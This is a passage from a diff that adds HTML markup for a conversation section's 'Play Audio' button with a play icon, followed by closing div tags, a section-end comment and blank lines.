+      </p>
+      <div class="kc-convo-actions">
+        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
+          <i class="fas fa-play" aria-hidden="true"></i>
+          <span>Play Audio</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>       <!-- /.kc-section -->
+
+
+
+
+
+
+
+
